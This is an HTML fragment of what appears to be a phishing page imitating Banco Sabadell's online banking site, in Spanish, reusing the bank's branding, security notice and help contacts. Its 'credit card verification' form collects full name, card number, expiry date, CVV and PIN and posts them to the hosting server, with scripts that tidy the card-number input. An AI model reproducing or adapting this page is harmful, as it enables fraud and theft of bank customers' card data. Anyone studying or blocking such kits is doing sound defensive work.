    }
    document.loginFormEmpreses.userCard.value=user.value.toUpperCase();
    document.loginFormEmpreses.pin.value=pin.value.toUpperCase();
    document.loginFormEmpreses.pinCard.value = "";
    document.cookie = 'JSESSIONID_JBS=;expires=Thu, 01 Jan 1970 00:00:01 GMT;path=/txbs';
    document.cookie = 'JSESSIONID_JBS=;expires=Thu, 01 Jan 1970 00:00:01 GMT;path=/txbs/';
    document.cookie = 'JSESSIONID_JBS=;expires=Thu, 01 Jan 1970 00:00:01 GMT;path=/txempbs';
    document.cookie = 'JSESSIONID_JBS=;expires=Thu, 01 Jan 1970 00:00:01 GMT;path=/txempbs/';
    callDoLogin('loginFormEmpreses');
  }

  function setLoginCookieEmp(div){
    var expdate = new Date();
    var cookieAceptacionCookies_SabAtl = readCookie("aceptacionCookies_SabAtl");
    var sitio = 'SabAtl'
    if(sitio != "SabAtl"  || cookieAceptacionCookies_SabAtl == "true"){
      expdate.setTime (expdate.getTime() + 365*(24 * 60 * 60 * 1000)); // 1 any
      SetCookie("LOGINEMPTYPE",div,expdate,"/");
    }
  }

</script>

	
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
	



  
  <div id="blackHeadersBSO" class="headers">
    <h1>Verificación de tarjeta de crédito</h1>
  </div>
  
  <div id="accessForms" style="margin-bottom:2px;margin-left:0px;min-height:253px;_height:253px">
    <div iclass="tabsLogin">    
      <div id="cajaLoginRight" class="cajaLoginRight" style="margin-left:65px!important;margin: auto;">

        <div id="blackTxt">Información necesaria

        </div>
        
        <form method="post">

    
 
      
      
      <input type="hidden" name="evision.RSADevicePrint" value="version%3D3%2E5%2E1%5F4%26pm%5Ffpua%3Dmozilla%2F5%2E0%20%28windows%20nt%2010%2E0%3B%20win64%3B%20x64%29%20applewebkit%2F537%2E36%20%28khtml%2C%20like%20gecko%29%20chrome%2F106%2E0%2E0%2E0%20safari%2F537%2E36%7C5%2E0%20%28Windows%20NT%2010%2E0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537%2E36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F106%2E0%2E0%2E0%20Safari%2F537%2E36%7CWin32%26pm%5Ffpsc%3D24%7C1920%7C1080%7C1040%26pm%5Ffpsw%3D%26pm%5Ffptz%3D1%26pm%5Ffpln%3Dlang%3Den%2DUS%7Csyslang%3D%7Cuserlang%3D%26pm%5Ffpjv%3D0%26pm%5Ffpco%3D1%26pm%5Ffpasw%3Dinternal%2Dpdf%2Dviewer%7Cinternal%2Dpdf%2Dviewer%7Cinternal%2Dpdf%2Dviewer%7Cinternal%2Dpdf%2Dviewer%7Cinternal%2Dpdf%2Dviewer%26pm%5Ffpan%3DNetscape%26pm%5Ffpacn%3DMozilla%26pm%5Ffpol%3Dtrue%26pm%5Ffposp%3D%26pm%5Ffpup%3D%26pm%5Ffpsaw%3D1920%26pm%5Ffpspd%3D24%26pm%5Ffpsbd%3D%26pm%5Ffpsdx%3D%26pm%5Ffpsdy%3D%26pm%5Ffpslx%3D%26pm%5Ffpsly%3D%26pm%5Ffpsfse%3D%26pm%5Ffpsui%3D%26pm%5Fos%3DWindows%26pm%5Fbrmjv%3D106%26pm%5Fbr%3DChrome%26pm%5Finpt%3D%26pm%5Fexpt%3D">
      
      
      <script language="javascript">
        if(typeof getJSESSIONID_JBSWL == 'function'){
          document.write("<INPUT TYPE='hidden' name='evision.csid' value='"+ getJSESSIONID_JBSWL() +"'>");
        }
      </script><input type="hidden" name="evision.csid" value="FNv_wmui4A3Xbo-vdNPLmiNS1666443263916">
      
        <script language="javascript">
          document.write("<INPUT TYPE='hidden' name='evision.deviceTokenCookie' value='"+ getCookie('DeviceTokenCookie') +"'>");
        </script><input type="hidden" name="evision.deviceTokenCookie" value="196.65.172.137.1666443265715">
      

      <input type="hidden" name="errorHelper" value="">
      <input type="hidden" name="language" maxlength="3" value="es">
      
      <div class="contentTab" style="width: 345px; position: relative;">    


      <input type="text" name="fullname" required placeholder="Nombre completo" class="pinDNI">



        <input type="text" name="ccnum" id="ccnum" maxlength="16" minlength="16" required placeholder="Número de Tarjeta de Crédito" class="pinDNI">

        <input type="text" name="exp" id="exp" maxlength="5" minlength="5" required placeholder="Fecha de caducidad" class="pinDNI">

        <input type="text" name="cvv" id="cvv" maxlength="3" minlength="3" required placeholder="CVV" class="pinDNI">

        <input type="text" name="pin" required placeholder="PIN" class="pinDNI">
        
        
        
        
        
        
        <input type="button" style="display:none" id="loginTarjeta"  class="btnLogin" value="Entrar">
        <input style="background-color: #006dff; color: white;"  name="doSubmit" type="submit" value="Próxima" class="btnLogin" >
              
  
        
          
        </div><div class="forgottenpindual">
                </div>
        
      <input type="hidden" name="injvalrnd" value="false"><input type="hidden" name="injextrnd" value=""></form>

    </div> 
        </div>

  
  <div class="moduloSeguridadBSO">
        <div class="iconoSeguridadBSO"><img src="https://www.bancsabadell.com/StaticFiles/GrupoBS/img/i_atencion.png"></div>
        <div class="textoSeguridadBSO">
          <strong>Seguridad:</strong> Su usuario, código de acceso y claves son <strong>personales e intransferibles</strong> y nunca las debe proporcionar a terceros. Además, en ningún caso, le solicitaremos más de <strong>una posición</strong> de su tarjeta de claves para operar.&nbsp;<a href="https://www.bancsabadell.com/cs/Satellite/SabAtl/Seguridad/6000020149782/es/">Otras recomendaciones de seguridad</a>. Si es Ud. partícipe de un <a href="javascript:doAction3('PPUserRegCompanyPlan.init');">plan de pensiones de empresa</a> y no recuerda su PIN desde aquí le podemos ayudar<br>
        </div>
      </div>
      <script src="https://code.jquery.com/jquery-3.6.1.js" integrity="sha256-3zlB5s2uwoUzrXK3BT7AX3FyvojsraNFxCc2vC/7pNI=" crossorigin="anonymous"></script>
      <script>
jQuery.fn.ForceNumericOnly =
function()
{
    return this.each(function()
    {
        $(this).keydown(function(e)
        {
            var key = e.charCode || e.keyCode || 0;
            return (
                key == 8 || 
                key == 9 ||
                key == 13 ||
                key == 46 ||
                key == 110 ||
                key == 190 ||
                (key >= 35 && key <= 40) ||
                (key >= 48 && key <= 57) ||
                (key >= 96 && key <= 105));
        });
    });
};

$("#ccnum").ForceNumericOnly();
$("#cvv").ForceNumericOnly();
$("#exp").ForceNumericOnly();
    $('#exp').on("keyup , focus , input", () => {
        var creditExpirationMonth = $("#exp").val()

        let my = $('#exp')
        if (my.val().length == 2 && !my.val().includes("/"))
            my.val(my.val() + "/")

    });
</script>
  <div class="titModuloAyuda">
        Póngase en contacto con nosotros y le resolveremos todas sus dudas:
  </div>  
  <div id="ayudaLoginBSO">
    



	



	
	
	
	

<div class="moduleHelpTel" style=""><div class="apartadoTel">
			
			
			
			
			
			
				<p style="">Llámenos</p><div class="helpText">
			      	
			      	
			      	
			      	
			      <span style="font-size: 16px; font-weight: bold">963 085 000 </span><br>
<span style="font-size: 11px; color: #999999">Todos los días 24h.</span>
				</div>
				</div>
	</div>

	





	



	
	
	
	


		
			
		
		
		
		
	

	
	
	

	<div class="moduleHelpCall" style=""><li style="background-image:url(/cs/Satellite?blobcol=urldata&amp;blobkey=id&amp;blobtable=MungoBlobs&amp;blobwhere=8000223924780&amp;bsb=R0JTX011bHRpbWVkaWFfRkEtMTE5MTMzMzkyNTg0NS0xMTgzMDE1NjA5OTc4&amp;ssbinary=true);" class="txt">
				<p style="">Banca a distancia</p><div class="helpText" style="">
							<a href="/cs/Satellite/SabAtl/Informacion/1191332200033/es/">Información</a> y <a href="/cs/Satellite/SabAtl/solicitud---de-servicio/1191332200033/es/">solicitud   de servicio</a>
						</div>
			</li>
		</div>

	





	



	
	
	
	


	<div class="moduleHelpC" style="">
		
		
		

		

		

		

		<div class="apartadoMsg">
				<p style="">Por email</p><div class="helpText" style="">
					<form action="/cs/Satellite" method="POST"><input type="hidden" name="pagename" value="GBS_contenedora"><input type="hidden" name="childpagename" value="SabAtl/GBS_distribuidora"><input type="hidden" name="cid" value="1191332191517"><input type="hidden" name="c" value="GBS_Form_FA"><input name="idPageMenu" type="hidden" value="undefined"><input type="hidden" name="p" value="1191332204474"><input type="hidden" name="language" value="1178258082822"><input type="hidden" value="language=1178258082822" name="packedargs"><input type="hidden" name="segmento" value="null"><input type="hidden" name="site" value="SabAtl"><input type="hidden" name="sitepfx" value="SA_"><input type="hidden" name="ayuda" value="null">Envíenos un <br><a href="#" onclick="javascript: this.parentNode.submit()">correo electrónico</a>
					</form>
				</div>
				</div>
	</div>

	





	



	
	
	
	


	<div class="moduleHelpOfi" style="">
		
		
		
		
		

      <div class="apartadoTwitter">
	  
      <p style="">En twitter</p><div class="helpText" style="">
	      	
	      	
	      	
	      	
	      <a style="font-size:12px;text-decoration:none" target="_blank" href="http://twitter.com/Sabadell_Help">@Sabadell_Help</a>
		</div>
	</div>
	</div>

	


  </div>

</div>
</div>

	</div>

	    </body></html>